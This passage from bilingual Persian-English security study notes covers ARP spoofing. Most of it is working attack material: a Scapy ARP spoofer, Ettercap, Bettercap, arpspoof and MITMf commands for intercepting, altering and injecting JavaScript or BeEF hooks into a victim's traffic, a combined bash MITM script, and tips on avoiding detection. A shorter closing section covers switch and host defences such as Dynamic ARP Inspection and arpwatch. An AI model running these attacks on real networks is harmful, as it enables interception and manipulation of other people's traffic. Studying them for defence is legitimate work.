    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]
    return result[0][1].hwsrc if result else None

def spoof(target_ip, spoof_ip):
    # می‌گه: "آی‌پی spoof_ip متعلق به مک آدرس منه"
    #Say it: spoof_ip for MY MAC(Attacker MAC)
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, src_ip):
    #Return it to Normal
    #برگردوندن به حالت عادی
    packet = ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    send(packet, count=4, verbose=False)

#Run Attack
target = "192.168.1.10"   #Victim IP
gateway = "192.168.1.1"   #Gateway IP

try:
    while True:
        spoof(target, gateway)   #Say to Victim: I am Gateway
        spoof(gateway, target)   #Say to Gateway: I am Victim
        time.sleep(2)
except KeyboardInterrupt:
    restore(target, gateway)
    restore(gateway, target)
    print("Return to Normal")
```
- **Running Code on Linux:**
	1. Install Scapy: `pip install scapy`
	2. Enable IP forwarding => برای قطع نشدن ترافیک
		1. `echo 1 > /proc/sys/net/ipv4/ip_forward`
	3. Run Code with Root Access `sudo python3 arp_spoofer.py`
- **Result of Attack:**
	1. حالا هر ترافیکی بین Victim و Gateway از دستگاه Attacker رد می‌شه. 
	2. این ترافیک رو میشه با Wireshark دیدش(حمله Traffic Stolen - سرقت ترافیک)
	3. یا با scapy محتوا رو عوض کنی(حمله Traffic Manipulation - تغییر ترافیک)
###### Method 2: Advance
- [[E10-Codes-Network Attacks Types#ARP Spoofing(Arp Cache Poisoning) - Advance Method]]
###### Method 2: More Advance
- [[E10-Codes-Network Attacks Types#ARP Spoofing(Arp Cache Poisoning) - More Advance Method]]
##### Using Kali Linux Tools
###### Using Ettercap(Most Powerful, Kali Linux Standard)
1. **Ettercap Description:**
	1. یکی از قدرتمند ترین ابزار های موجود در کالی لینوکس برای پیاده سازی انواع حملات شبکه
```sh
#Run in GUI Mode
sudo ettercap -G

#Run in TUI(Terminal Interactive Mode)
sudo ettercap -C

#Direct ARP Spoof with Specific Target on eth0
sudo ettercap -T -M arp:remote /192.168.1.10/ /192.168.1.1/ -i eth0

# همراه با فیلتر (مثلاً تعویض تصاویر!)
#Direct ARP Spoof with Filtering(i.e: Change Pictures)
sudo ettercap -T -M arp:remote /192.168.1.10/ /192.168.1.1/ -i eth0 -F my_filter.ef

#Save PCAP
sudo ettercap -T -M arp:remote /192.168.1.10/ /192.168.1.1/ -i eth0 -w capture.pcap
```
###### Using Bettercap(Modern, Modular - Ettercap Alternative)
1. **Bettercap Description:**
	1. این ابزار بر روی Ettercap نوشته شده و سعی کرده که حفره های درون Ettercap را جایگزین کند و در واقع ابزار Ettercap را ارتقا دهد.
```sh
#Installation
sudo apt install bettercap

#Start 
sudo bettercap -iface eth0

#Bettercap in Terminal:
#Network Scanning
net.probe on
net.show

#Set Targets
set arp.spoof.targets 192.168.1.10,192.168.1.15

#Start ARP Spoof
arp.spoof on

#Enable Sniffing HTTP/HTTPS
http.proxy on
https.proxy on

#Enable all Sniff Modules
net.sniff on

# Saving PCAP
set net.sniff.output capture.pcap
```
###### Using Arpspoof(Simple, Fast, Part of dsniff)
1. **Arpspoof Description:**
	1. این ابزار که بخشی از مجموعه dsniff است برای پیاده سازی سریع و آسان حمله ARP Spoofing(Arp Cache Poisoning) استفاده میشود.
```sh
#Installation
sudo apt install dsniff

#Enable Forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

#Arp Spoof - Say to Victim(I am Gateway)
#ارسال به قربانی (بهش بگو من گیت‌وی هستم)
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 &

#Arp Spoof - Say to Gateway(I am Victim)
#ارسال به گیت‌وی (بهش بگو من قربانی هستم)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 &

#Sniffing with tcpdump
sudo tcpdump -i eth0 host 192.168.1.10
```
###### Using MITMf(MITM Framework)
```sh
#Installation
sudo apt install mitmf

#ARP Spoof With HTTP Sniffing 
sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 -i eth0

#Inject Java Script Codes
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 \
    --inject --js-file inject.js -i eth0

#Enable BeEF hook
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 \
    --inject --beef-hook -i eth0
```
###### Using Arp-Scan(Additional - For Detection)
```sh
#LAN Network Scanning
sudo arp-scan --localnet

#Scan Range of Network
sudo arp-scan 192.168.1.0/24

#Show MAC and Detect Vendor's 
sudo arp-scan --localnet -v
```
###### Professional Method(Combination of Ettercap + tcpdump + Arpspoof)
- **Description:**
	1. در اسکریپت زیر که به زبان Bash نوشتیم حمله ARP Spoofing و سپس Sniffing را بصورت کامل انجام میدهیم که در واقع یک نوع از حمله MITM بصورت کامل است.
	2. این اسکریپت مراحل زیر را انجام میدهد:
		1. فعال سازی IP Forwarding
		2. شروع Arp Spoofing
		3. شروع Sniffing
		4. اعمال فیلتر های Ettercap
		5. توقف و خروج
```sh
#!/bin/bash
# اسکریپت ترکیبی برای MITM حرفه‌ای

GATEWAY="192.168.1.1"
TARGET="192.168.1.10"
IFACE="eth0"

echo "[+] Enable IP Forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[+] Start ARP Spoofing"
arpspoof -i $IFACE -t $TARGET $GATEWAY &> /dev/null &
arpspoof -i $IFACE -t $GATEWAY $TARGET &> /dev/null &

echo "[+] Start Sniffing"
tcpdump -i $IFACE -w capture.pcap &

echo "[+] Apply Ettercap Filter"
ettercap -T -q -i $IFACE -M arp:remote /$GATEWAY/ /$TARGET/

echo "[+] Stop"
killall arpspoof tcpdump
```
##### Golden Notes
1. **همیشه IP Forwarding** را چک کنید - بدون آن، اینترنت قربانی قطع می‌شود و حمله لو می‌رود.
2. **فرکانس ARP را بالاتر ببرید** اگر شبکه شلوغ است (مثلاً هر ۱ ثانیه).
3. **برای HTTPS:** ابزار Bettercap قابلیت `SSLstrip` دارد، ولی گواهی جعلی می‌دهد و مرورگر هشدار نشان می‌دهد.
#### Detection & Hardening Solutions
##### Switch Level Defense Methods
روش هایی که در زیر توضیح میدهیم در سمت سوئیچ شبکه پیاده سازی میشوند.
1. **Dynamic ARP Inspection (DAI) - Most Powerful Defense Method**
	1. **مکانیزم:** 
		1. سوییچ Cisco هر بسته ARP را با پایگاه داده DHCP Snooping تطبیق می‌دهد. تنها MAC-IP معتبر مجاز به عبور است.
		2. در واقع با فعال کردن این گزینه سوییچ‌ های سیسکو ARP های غیرمجاز را Drop می‌کنند.
	2. **چرا این بهترین است؟** 
		1. مهاجم حتی با MAC معتبر هم نمی‌تواند IP جعل کند، چون MAC-IP باید در جدول DHCP Snooping ثبت شده باشد.
```sh
#Step 1: Enable DHCP Snooping
Switch(config)$ ip dhcp snooping
Switch(config)$ ip dhcp snooping vlan 10,20,30

#Step 2: Define Trust Port (on Gateway Port)
Switch(config)$ interface gi0/1
Switch(config-if)$ ip dhcp snooping trust

#Step 3: Enable DAI on VLAN
Switch(config)$ ip arp inspection vlan 10,20,30

#Step 4: Apply Rate Limit for ARP(Optional)
Switch(config)$ interface range gi0/2-24
Switch(config-if)$ ip arp inspection limit rate 15  ! حداکثر ۱۵ بسته ARP در ثانیه
```
2. **Port Security + IP Source Guard:**
```sh Cisco
#Limited allowed MAC Address on Access Port 
Switch(config)$ interface gi0/5
Switch(config-if)$ switchport port-security
Switch(config-if)$ switchport port-security maximum 1
Switch(config-if)$ switchport port-security violation shutdown

#Combine it to IP Source Guard
Switch(config)$ interface gi0/5
Switch(config-if)$ ip verify source port-security
```
3. **Using VLAN Isolation (PVLAN):**
```sh Cisco
#Split Devices in VLAN
Switch(config)$ vlan 10
Switch(config-vlan)$ private-vlan community
# isolated (Full Isolated)
```
##### Host Level Defense Methods
روش هایی که در زیر توضیح میدهیم در سمت دیوایس های شبکه پیاده سازی میشوند.
1. **Using Static ARP Entry:**
	1. تنظیم دستی ARP روی سرور ها (روشی که در پورتال بانکی استفاده میشود)
	2. **عیب:** با تغییر MAC گیت‌ وی (مثلاً در Failover)، ارتباط قطع می‌شود.
```sh
###---------- Linux ----------###
#Enable Static ARP Entry
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

#Make Persistent /etc/ethers
echo "192.168.1.1 aa:bb:cc:dd:ee:ff" | sudo tee -a /etc/ethers

###---------- Windows (Admin CMD) ----------###
arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff
```
2. **`XArp` / `Arpwatch` / `ArpON`**
	1. ابزارهای تشخیص ARP Spoofing
```sh
#ARPwatch: Monitoring and Alerts
sudo apt install arpwatch
sudo arpwatch -i eth0
#Logs File: /var/log/arpwatch.log

#ArpON: Automatic Blocking
sudo apt install arpon
sudo arpon -i eth0 -d  #Start Defense
```
3. **Kernel ARP Hardening:**
```sh Linux Only
#Reject Gratuitous ARP (ARP های ناخواسته)
sudo sysctl net.ipv4.conf.all.arp_ignore=1
sudo sysctl net.ipv4.conf.all.arp_announce=2

#فیلتر ARP های مشکوک
sudo sysctl net.ipv4.conf.all.arp_filter=1
```
4. **ARP Cache Monitoring:**
	1. ابزاری برای تشخیص ARP Spoofing

##### Conclusion
1. **در سوئیچ:** استفاده از Dynamic ARP Inspection (DAI) روی سوییچ،
2. **در هاست:** استفاده از نرم افزار های IDS(Detection Systems) مثل `ARPWatch`.
### !